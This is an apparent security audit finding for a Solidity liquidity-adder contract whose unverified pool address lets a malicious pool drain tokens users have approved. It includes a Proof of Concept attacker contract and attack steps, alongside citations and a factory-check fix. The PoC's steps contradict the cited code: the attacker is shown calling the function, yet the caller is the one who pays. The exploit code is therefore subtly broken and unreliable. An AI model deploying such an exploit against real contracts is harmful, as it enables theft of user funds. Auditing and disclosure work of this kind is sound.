### Title
Unverified Pool Address in `MetricOmmPoolLiquidityAdder` Allows Malicious Pool to Drain User-Approved Tokens - (File: metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol)

### Summary
`MetricOmmPoolLiquidityAdder` accepts an arbitrary `pool` address without verifying it against the factory registry. A malicious pool contract can exploit the callback settlement path to pull any ERC-20 token the user has approved to the adder, up to the user-supplied `maxAmountToken0`/`maxAmountToken1` caps.

### Finding Description

`addLiquidityExactShares` and `addLiquidityWeighted` accept a caller-supplied `pool` address and immediately store it as the trusted callback counterparty in transient storage via `_setPayContext`. [1](#0-0) 

`_addLiquidity` then calls `IMetricOmmPoolActions(pool).addLiquidity(...)` on that unverified address. [2](#0-1) 

Inside `metricOmmModifyLiquidityCallback`, the only caller check is `msg.sender != expectedPool`, where `expectedPool` is the attacker-controlled address stored in transient storage — so the check trivially passes for the malicious pool. [3](#0-2) 

After passing the caller check, the callback reads `token0`/`token1` directly from `IMetricOmmPool(msg.sender).getImmutables()` — again querying the attacker-controlled contract — and then calls `pay(token0, payer, msg.sender, amount0Delta)`, pulling tokens from the victim to the malicious pool. [4](#0-3) 

The contract's own NatSpec explicitly acknowledges this gap: [5](#0-4) 

### Impact Explanation

A victim who has approved `MetricOmmPoolLiquidityAdder` for any ERC-20 (e.g., USDC, USDT, WETH) can have up to `maxAmountToken0` + `maxAmountToken1` of those tokens stolen in a single transaction. The attacker controls both the token identity (via `getImmutables()`) and the pull amount (via the `amount0Delta`/`amount1Delta` values returned in the callback), bounded only by the victim's own caps. This is a direct loss of user principal.

### Likelihood Explanation

- The victim must have approved the adder and must be induced to call it with a malicious pool address (e.g., via a phishing UI or a malicious front-end).
- No privileged role is required on the attacker's side; deploying a malicious pool contract is permissionless.
- The factory is never consulted, so there is no on-chain guard that can prevent this path.

Likelihood is **Medium** (requires social engineering), impact is **High** (full loss of approved balance up to user caps), overall severity is **Medium**.

### Recommendation

Before storing `pool` in transient context and calling into it, verify it was deployed by the canonical `MetricOmmPoolFactory`:

```solidity
// In _addLiquidity (or at the top of each public entry point):
if (!IMetricOmmPoolFactory(factory).isPool(pool)) revert UnknownPool(pool);
```

This mirrors the whitelist pattern used in `MetricOmmSwapRouterBase`, which stores the expected callback pool in transient storage only after verifying the pool is a known factory deployment via `_requireExpectedCallbackCaller`. [6](#0-5) 

### Proof of Concept

```solidity
// Attacker deploys:
contract MaliciousPool {
    address public immutable victim;
    address public immutable adder;
    address public immutable stolenToken;

    constructor(address _victim, address _adder, address _token) {
        victim = _victim; adder = _adder; stolenToken = _token;
    }

    // Called by LiquidityAdder._addLiquidity
    function addLiquidity(address, uint80, LiquidityDelta calldata, bytes calldata, bytes calldata)
        external returns (uint256, uint256)
    {
        // Trigger callback with max amounts, KIND_PAY encoding
        IMetricOmmPoolLiquidityAdder(adder).metricOmmModifyLiquidityCallback(
            1000e6, 0, abi.encode(uint8(1)) // KIND_PAY = 1
        );
        return (1000e6, 0);
    }

    // Called by callback to resolve token addresses
    function getImmutables() external view returns (PoolImmutables memory imm) {
        imm.token0 = stolenToken; // e.g. USDC
        imm.token1 = address(0);
    }
}

// Attack:
// 1. victim.approve(adder, 1000e6 USDC)
// 2. attacker calls:
adder.addLiquidityExactShares(
    address(maliciousPool),
    victim,          // owner
    0,               // salt
    deltas,
    1000e6,          // maxAmountToken0 — attacker sets this to victim's full approval
    0,
    ""
);
// Result: 1000 USDC transferred from victim → maliciousPool
```

### Citations

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L19-21)
```text
/// @dev The caller is responsible for supplying a legitimate pool address and other non-malicious parameters.
///      This contract does not verify the pool against the factory; a malicious pool can request token pulls up to
///      the caller-provided max caps during callback settlement.
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L56-68)
```text
  function addLiquidityExactShares(
    address pool,
    address owner,
    uint80 salt,
    LiquidityDelta calldata deltas,
    uint256 maxAmountToken0,
    uint256 maxAmountToken1,
    bytes calldata extensionData
  ) external payable override returns (uint256 amount0Added, uint256 amount1Added) {
    _validateOwner(owner);
    _validateDeltas(deltas);
    return _addLiquidity(pool, owner, salt, deltas, msg.sender, maxAmountToken0, maxAmountToken1, extensionData);
  }
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L162-165)
```text
    (address expectedPool, address payer, uint256 max0, uint256 max1) = _loadPayContext();
    if (expectedPool == address(0)) revert CallbackContextNotActive();
    if (msg.sender != expectedPool) revert InvalidCallbackCaller(msg.sender, expectedPool);
    if (amount0Delta > max0 || amount1Delta > max1) {
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L169-177)
```text
    PoolImmutables memory imm = IMetricOmmPool(msg.sender).getImmutables();
    address token0 = imm.token0;
    address token1 = imm.token1;
    if (amount0Delta > 0) {
      pay(token0, payer, msg.sender, amount0Delta);
    }
    if (amount1Delta > 0) {
      pay(token1, payer, msg.sender, amount1Delta);
    }
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L183-207)
```text
  function _addLiquidity(
    address pool,
    address positionOwner,
    uint80 salt,
    LiquidityDelta memory deltas,
    address payer,
    uint256 maxAmountToken0,
    uint256 maxAmountToken1,
    bytes calldata extensionData
  ) internal returns (uint256 amount0Added, uint256 amount1Added) {
    _setPayContext(pool, payer, maxAmountToken0, maxAmountToken1);
    try IMetricOmmPoolActions(pool)
      .addLiquidity(positionOwner, salt, deltas, abi.encode(KIND_PAY), extensionData) returns (
      uint256 a0, uint256 a1
    ) {
      amount0Added = a0;
      amount1Added = a1;
      _clearPayContext();
    } catch (bytes memory reason) {
      _clearPayContext();
      assembly ("memory-safe") {
        revert(add(reason, 32), mload(reason))
      }
    }
  }
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L46-50)
```text
  function metricOmmSwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external override {
    if (amount0Delta <= 0 && amount1Delta <= 0) revert InvalidSwapDeltas();

    _requireExpectedCallbackCaller(msg.sender);

```
